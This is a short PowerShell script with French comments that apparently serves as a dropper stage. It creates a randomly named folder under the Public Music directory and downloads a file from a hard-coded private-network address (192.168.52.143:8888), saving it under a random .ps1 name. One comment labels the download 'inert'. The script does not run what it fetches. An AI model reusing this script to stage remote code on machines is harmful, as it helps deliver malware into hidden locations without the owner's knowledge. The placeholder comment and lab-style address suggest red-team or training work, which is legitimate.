# A REMPLIR
$DownloadUrl = "http://192.168.52.143:8888"

# Dossier Public Music aléatoire
$BasePath = "$env:PUBLIC\Music"
$RandomName = [guid]::NewGuid().ToString("N")

$DropPath = Join-Path $BasePath $RandomName

New-Item -Path $DropPath -ItemType Directory -Force | Out-Null

# Téléchargement inerte
$DownloadedFile = Join-Path $DropPath (
    [guid]::NewGuid().ToString("N") + ".ps1"
)

if (-not [uri]::IsWellFormedUriString(
    $DownloadUrl,
    [UriKind]::Absolute
)) {
    throw "URL invalide"
}

Invoke-WebRequest -Uri $DownloadUrl -OutFile $DownloadedFile